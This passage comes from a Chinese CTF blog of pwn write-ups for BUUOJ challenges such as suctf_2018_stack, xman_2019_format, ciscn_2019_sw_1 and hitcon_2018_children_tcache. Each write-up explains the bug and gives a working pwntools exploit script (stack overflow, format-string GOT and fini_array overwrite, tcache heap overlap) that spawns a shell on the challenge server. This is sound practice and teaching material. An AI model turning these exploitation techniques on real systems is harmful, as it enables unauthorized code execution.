punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size is :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name is :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0400B9C</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'666'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'555'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"suctf_2018_stack\"><a class=\"markdownIt-Anchor\" href=\"#suctf_2018_stack\">#</a> suctf_2018_stack</h1>\n<p>** 考点：**ret2libc, 基础</p>\n<p>很基础的题，记得选后门地址时跳过一个 <code>push rbp</code>  以对齐栈帧。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./SUCTF_2018_stack')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27735</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x40067a</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"picoctf_2018_are_you_root\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_are_you_root\">#</a> PicoCTF_2018_are_you_root</h1>\n<p>** 考点：**uaf, strdup</p>\n<p><strong>重点！</strong> strdup 会新建一个堆块以复制字符串。</p>\n<p>该题会分配一个 0x10 大小的 note chunk 用于管理用户名和权限。用户名是将输入的字符串用 <code>strdup()</code>  复制后将地址写入 note chunk 中。重置账户功能会释放 strdup 分配的 chunk。</p>\n<p>因此我们第一次输入的用户名为 0x10 大小，并且在其 + 8 的位置输入 <code>p64(5)</code> 。</p>\n<p>这样重置用户然后再次登录，这时管理用户的 note chunk 就会分配为刚刚 strdup 分配的块。由于写入的 5 数据没有被抹除，所以此时账号为权限 5，可以直接读取 flag。</p>\n<pre><code class=\"language-pyhon\">#!/usr/bin/python3\nfrom pwn import *\ncontext(arch='amd64', log_level='debug')\n\nfilename = 'PicoCTF_2018_are_you_root'\nmode = int(sys.argv[1]) if len(sys.argv)&gt;1 else 0\np = process('./'+filename+'_pe') if mode else remote('node4.buuoj.cn',25967)\ne = ELF('./'+filename+'_pe') if mode else ELF('./'+filename)\n\nif mode==2:\n    gdb.attach(p, 'b ')\n\ncmdlist = ['','show','login','set_auth', 'get-flag','reset','quit']\ndef cmd(index, content=b''):\n    payload = cmdlist[index].encode() + b' ' + content\n    p.sendlineafter(b'command:', payload)\n\ncmd(2, b'a'*8+p64(5))\ncmd(5)\ncmd(2, b'getshell!')\ncmd(4)\n\np.interactive()\n</code></pre>\n<h1 id=\"xman_2019_format\"><a class=\"markdownIt-Anchor\" href=\"#xman_2019_format\">#</a> xman_2019_format</h1>\n<p>** 考点：**fmtstr, 爆破</p>\n<p>** 版本：**32 位</p>\n<p>存在后门函数。</p>\n<p>利用 ebp 作跳板，修改 <code>0xffe16cf8</code>  处的数据为 rip 的地址，然后再修改 rip 为后门函数地址。这样可以只修改一个或两个字节。但是栈上地址是随机的，只能确定地址最后一位为 0xc，倒数第二位爆破即可。</p>\n<p><img data-src=\"./image-20231121213657165.png\" alt=\"image-20231121213657165\"></p>\n<p>ebp 对应的参数位置。 <code>index=(0xffe16cd8-0xffe16cb0)//4 =0xa=10</code></p>\n<p>6cf8 对应参数位置。 <code>index=(0xffe16cf8-0xffe16cb0)//4 =0x12=18</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485b4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstrhh</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$hhn'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstrh</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$hn'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">#p=process('./xman_2019_format_pe')</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25040</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'i:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        p1 <span class=\"token operator\">=</span> fmtstrhh<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        p2 <span class=\"token operator\">=</span> fmtstrh<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'|'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以尝试修改 got 表，但是由于同时修改四字节，输出过多，因此只有本地打得通。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context(log_level='debug')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./xman_2019_format'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./xman_2019_format_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',27985)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485AB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstr</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$n'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p1 <span class=\"token operator\">=</span> fmtstr<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> printf_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p2 <span class=\"token operator\">=</span> fmtstr<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p3 <span class=\"token operator\">=</span> <span class=\"token string\">b'getshell'</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'|'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_sw_1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_sw_1\">#</a> *ciscn_2019_sw_1</h1>\n<p><strong>考点：</strong> fmtstr, fini_array</p>\n<p>** 版本：**libc6_2.27 amd64</p>\n<p>只开启了 nx 保护，所以可以知道任何程序本身的地址。</p>\n<p>从第 4 个参数开始为字符串所在位置。</p>\n<p><img data-src=\"./image-20231127013447501.png\" alt=\"image-20231127013447501\"></p>\n<p>该程序只有一次执行格式化漏洞的机会，而栈上已有地址也没有啥能利用的。</p>\n<p>该版本下，主函数执行完， <code>__libc_start_main</code>  函数会执行一次 fini_array。所以虽然不知道栈上地址以至于不能修改 rip 地址，但可以利用 fini_array 跳转到任意地址。</p>\n<p>原先想跳转到后门函数 <code>_sys</code>  的，但其利用的参数 <code>command</code>  为常量不可读写，所以最后采用在修改 fini_array 的同时修改 printf 的 got 表为 system 的 plt 地址，在 fini_array 跳转到 main 函数时便获得了第二次利用 printf 的机会。此时输入 <code>/bin/sh</code>  便可以 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_2019_sw_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_2019_sw_1_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',29536)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x0804851B</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cmd <span class=\"token operator\">=</span> <span class=\"token number\">0x08048640</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fini <span class=\"token operator\">=</span> <span class=\"token number\">0x0804979C</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_p<span class=\"token punctuation\">,</span> fini<span class=\"token punctuation\">:</span>p16<span class=\"token punctuation\">(</span>main_a<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>write_size<span class=\"token operator\">=</span><span class=\"token string\">'short'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里覆盖 fini_array 的地址覆盖低二位字节就好。</p>\n<img data-src=\"./image-20231127150741779.png\" alt=\"image-20231127150741779\" style=\"zoom:50%;\" />\n<h1 id=\"hitcon_2018_children_tcache\"><a class=\"markdownIt-Anchor\" href=\"#hitcon_2018_children_tcache\">#</a> hitcon_2018_children_tcache</h1>\n<p>** 考点：**tcache dup, overlap extend, null byte off by one</p>\n<p>** 版本：**libc6_2.27</p>\n<p>保护全开。free 后清空地址。</p>\n<p>程序用 strcpy 将字符串复制到块上，存在 null byte off by one 漏洞。在两个大 chunk 中夹一个小 chunk，利用小 chunk 修改大 chunk 的 inuse 标志，使得释放后能构成块重叠。</p>\n<p>由于用的是 strcpy 复制的字符串，因此遇到 <code>'\\0'</code>  便会停止，同时每次 free 时都会根据 malloc 时用户输入的 size 将 chunk 用 <code>'\\xba'</code>  填充，因此需要逐步设置最后属于 prevsize 的 8 个字节。</p>\n<p>构造块重叠后，先后将头尾两个大 chunk 释放，此时会合并两个 chunk 为一个，而小 chunk 位于中间。这时候分配与原先第二个 chunk 大小相同的 chunk，这时候 unsorted chunk 的开头便与小 chunk 开头重叠，这时候输出小 chunk，便可以泄露 mainarena 地址。</p>\n<p>随后修改 malloc_hook 为 one_gadget 地址便可。</p>\n<p>one_gadget 选第二个或第三个均可。</p>\n<img data-src=\"./image-20231127202549017.png\" alt=\"image-20231127202549017\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231127202604983.png\" alt=\"image-20231127202604983\" style=\"zoom: 67%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'HITCON_2018_children_tcache'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/ctftools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25532</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x00FDF)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 